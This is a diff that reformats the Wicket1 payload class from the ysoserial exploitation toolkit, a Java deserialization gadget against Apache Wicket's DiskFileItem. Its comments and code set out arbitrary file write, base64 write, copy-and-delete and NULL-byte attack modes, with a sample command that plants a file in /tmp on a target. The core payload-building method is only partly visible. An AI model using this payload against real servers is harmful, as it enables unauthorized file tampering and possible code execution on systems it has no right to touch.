@@ -1,21 +1,20 @@
 package ysoserial.payloads;
 
 
-import java.io.File;
-import java.io.IOException;
-import java.io.OutputStream;
-import java.util.Arrays;
-
 import org.apache.commons.codec.binary.Base64;
-import org.apache.wicket.util.upload.DiskFileItem;
 import org.apache.wicket.util.io.DeferredFileOutputStream;
 import org.apache.wicket.util.io.ThresholdingOutputStream;
-
+import org.apache.wicket.util.upload.DiskFileItem;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
+
+import java.io.File;
+import java.io.IOException;
+import java.io.OutputStream;
+import java.util.Arrays;
 
 
 /**
@@ -25,67 +24,38 @@ import ysoserial.payloads.util.Reflections;
  * means that if the target is running less than Oracle Java 7 update 40
  * then the NULL byte attack is viable. Otherwise, copy and move attacks
  * always work.
- *
+ * <p>
  * This attack is valid for the 1.x and 6.x lines of Apache Wicket but
  * was fixed in 1.5.16 and 6.24.0 (released July 2016).
- *
- *
+ * <p>
+ * <p>
  * Arguments:
  * - copyAndDelete;sourceFile;destDir
  * - write;destDir;ascii-data
  * - writeB64;destDir;base64-data
  * - writeOld;destFile;ascii-data
  * - writeOldB64;destFile;base64-data
- *
+ * <p>
  * Example:
  * Wicket1 "write;/tmp;blue lobster"
- *
+ * <p>
  * Result:
  * $ ls -l /tmp/
  * -rw-rw-r-- 1 albino_lobster albino_lobster   12 Jul 25 14:10 upload_3805815b_2d50_4e00_9dae_a854d5a0e614_479431761.tmp
  * $ cat /tmp/upload_3805815b_2d50_4e00_9dae_a854d5a0e614_479431761.tmp
  * blue lobster
  */
-@PayloadTest(harness="ysoserial.test.payloads.FileUploadTest", flaky="possible race condition")
+@PayloadTest(harness = "ysoserial.test.payloads.FileUploadTest", flaky = "possible race condition")
 @Dependencies({"org.apache.wicket:wicket-util:6.23.0", "org.slf4j:slf4j-api:1.6.4"})
-@Authors({ Authors.JACOBAINES })
+@Authors({Authors.JACOBAINES})
 public class Wicket1 implements ReleaseableObjectPayload<DiskFileItem> {
 
-    public DiskFileItem getObject(String command) throws Exception {
-
-        String[] parts = command.split(";");
-
-        if (parts.length != 3) {
-        	throw new IllegalArgumentException("Bad command format.");
-        }
-
-        if ("copyAndDelete".equals(parts[0])) {
-            return copyAndDelete(parts[1], parts[2]);
-        }
-        else if ("write".equals(parts[0])) {
-            return write(parts[1], parts[2].getBytes("US-ASCII"));
-        }
-        else if ("writeB64".equals(parts[0]) ) {
-            return write(parts[1], Base64.decodeBase64(parts[2]));
-        }
-        else if ("writeOld".equals(parts[0]) ) {
-            return writeOldJRE(parts[1], parts[2].getBytes("US-ASCII"));
-        }
-        else if ("writeOldB64".equals(parts[0]) ) {
-            return writeOldJRE(parts[1], Base64.decodeBase64(parts[2]));
-        }
-        throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(parts));
-    }
-
-	public void release(DiskFileItem obj) throws Exception {
-	}
-
-    private static DiskFileItem copyAndDelete ( String copyAndDelete, String copyTo ) throws IOException, Exception {
+    private static DiskFileItem copyAndDelete(String copyAndDelete, String copyTo) throws IOException, Exception {
         return makePayload(0, copyTo, copyAndDelete, new byte[1]);
     }
 
     // writes data to a random filename (update_<per JVM random UUID>_<COUNTER>.tmp)
-    private static DiskFileItem write ( String dir, byte[] data ) throws IOException, Exception {
+    private static DiskFileItem write(String dir, byte[] data) throws IOException, Exception {
         return makePayload(data.length + 1, dir, dir + "/whatever", data);
     }
 
@@ -109,7 +79,32 @@ public class Wicket1 implements ReleaseableObjectPayload<DiskFileItem> {
         return diskFileItem;
     }
 
-    public static void main ( final String[] args ) throws Exception {
+    public static void main(final String[] args) throws Exception {
         PayloadRunner.run(FileUpload1.class, args);
+    }
+
+    public DiskFileItem getObject(String command) throws Exception {
+
+        String[] parts = command.split(";");
+
+        if (parts.length != 3) {
+            throw new IllegalArgumentException("Bad command format.");
+        }
+
+        if ("copyAndDelete".equals(parts[0])) {
+            return copyAndDelete(parts[1], parts[2]);
+        } else if ("write".equals(parts[0])) {
+            return write(parts[1], parts[2].getBytes("US-ASCII"));
+        } else if ("writeB64".equals(parts[0])) {
+            return write(parts[1], Base64.decodeBase64(parts[2]));
+        } else if ("writeOld".equals(parts[0])) {
+            return writeOldJRE(parts[1], parts[2].getBytes("US-ASCII"));
+        } else if ("writeOldB64".equals(parts[0])) {
+            return writeOldJRE(parts[1], Base64.decodeBase64(parts[2]));
+        }
+        throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(parts));
+    }
+
+    public void release(DiskFileItem obj) throws Exception {
     }
 }
